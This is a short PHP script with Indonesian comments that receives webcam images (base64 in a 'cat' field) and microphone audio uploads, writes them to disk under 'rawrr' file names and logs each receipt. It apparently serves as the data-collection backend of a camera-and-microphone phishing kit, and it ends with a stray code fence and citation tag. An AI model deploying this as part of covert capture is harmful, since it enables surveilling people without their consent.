<?php

$date = date('dMYHis');

// 1. Menangani kiriman data gambar dari kamera
if (!empty($_POST['cat'])) {
    error_log("Received Image: " . $date . "\r\n", 3, "log.txt");

    $imageData = $_POST['cat'];
    $filteredData = substr($imageData, strpos($imageData, ",") + 1);
    $unencodedData = base64_decode($filteredData);
    
    $fp = fopen('rawrr-' . $date . '.png', 'wb');
    fwrite($fp, $unencodedData);
    fclose($fp);
}

// 2. Menangani kiriman data suara dari mikrofon
if (isset($_FILES['audio'])) {
    error_log("Received Audio: " . $date . "\r\n", 3, "log.txt");
    
    $uploadFile = 'rawrrrr-AUDIO-' . $date . '.webm';
    move_uploaded_file($_FILES['audio']['tmp_name'], $uploadFile);
}

exit();
?>
```[cite: 6]